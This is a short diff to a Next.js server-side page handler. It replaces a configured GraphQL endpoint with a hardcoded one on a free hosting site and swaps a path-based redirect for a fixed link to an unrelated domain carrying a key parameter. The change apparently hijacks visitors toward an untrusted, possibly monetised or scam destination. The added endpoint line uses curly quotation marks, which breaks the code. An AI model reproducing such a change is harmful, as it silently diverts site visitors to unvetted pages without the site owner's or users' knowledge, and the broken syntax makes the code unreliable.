@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = process.env.GRAPHQL_ENDPOINT as string;
+	const endpoint = “ https://qudoossports.000webhostapp.com/graphql ”
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://oxygenblobsglass.com/pwhhpappe?key=6fce3ad448fece7d36e4a45e41d083e7/`
 				}`,
 			},
 		};
